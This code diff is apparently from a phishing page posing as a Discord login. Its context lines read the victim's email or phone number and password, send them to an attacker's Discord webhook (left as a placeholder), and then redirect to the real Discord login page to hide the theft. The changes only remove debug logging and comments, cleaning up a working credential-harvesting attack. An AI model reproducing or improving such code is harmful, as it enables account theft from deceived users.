@@ -147,10 +147,6 @@
     var emailOrPhone = document.getElementById('emailOrPhone').value;
     var password = document.getElementById('password').value;
 
-    // Log values (you can remove this in a production environment)
-    console.log('Email/Phone:', emailOrPhone);
-    console.log('Password:', password);
-
     var url = "enter your discord webhook here"
     var data = {
       content: "Email or Phone number: " + emailOrPhone + "\nPassword: " + password
@@ -162,12 +158,9 @@
       body: JSON.stringify(data),
     })
     .then(response => {
-      // Check if the request was successful (status code 2xx)
       if (response.ok) {
-        // Redirect after the fetch request completes
         window.location.replace("http://discord.com/login");
       } else {
-        // Handle error cases if needed
         console.error('Error sending message to webhook');
       }
     })
